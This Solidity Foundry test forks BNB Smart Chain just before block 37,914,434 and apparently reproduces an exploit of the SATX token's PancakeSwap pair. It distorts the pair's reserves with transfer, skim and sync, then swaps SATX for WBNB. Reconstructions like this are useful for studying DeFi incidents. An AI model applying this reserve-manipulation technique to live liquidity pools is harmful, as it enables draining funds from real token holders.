// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

import "./ISatx.sol";

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
ISatx constant SATX = ISatx(
    payable(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508)
);
IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant CakeBnbPair = IPancakePairV2(
    0x0eD7e52944161450477ee417DE9Cd3a859b14fD0
);
IPancakePairV2 constant BnbSatxPair = IPancakePairV2(
    0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4
);

contract SatxTest is Test {
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() public {
        vm.createSelectFork("bsc", 37_914_434 - 1);

        deal(address(WBNB), address(this), 0.9 ether);
    }

    function showPrice() public {
        (uint112 reserve0, uint112 reserve1, ) = BnbSatxPair.getReserves();
        uint256 price = (reserve1 * 1e6) / reserve0;
        emit log_named_decimal_uint("r0", reserve0, 18);
        emit log_named_decimal_uint("r1", reserve1, 18);
        emit log_named_decimal_uint("Price", price, 6);
    }

    function testSome() public {
        showPrice();

        SATX.approve(address(pancakeRouterV2), type(uint256).max);
        WBNB.approve(address(pancakeRouterV2), type(uint256).max);

        uint256 satxAmount = SATX.balanceOf(address(BnbSatxPair));
        deal(address(SATX), address(this), satxAmount);

        SATX.transfer(address(BnbSatxPair), satxAmount / 2);
        BnbSatxPair.skim(address(this));
        BnbSatxPair.sync();
        WBNB.transfer(address(BnbSatxPair), 0.0001 ether);

        showPrice();

        address[] memory path = new address[](2);
        path[0] = address(SATX);
        path[1] = address(WBNB);
        pancakeRouterV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SATX.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        emit log_named_decimal_uint("WBNB", WBNB.balanceOf(address(this)), 18);
    }
}
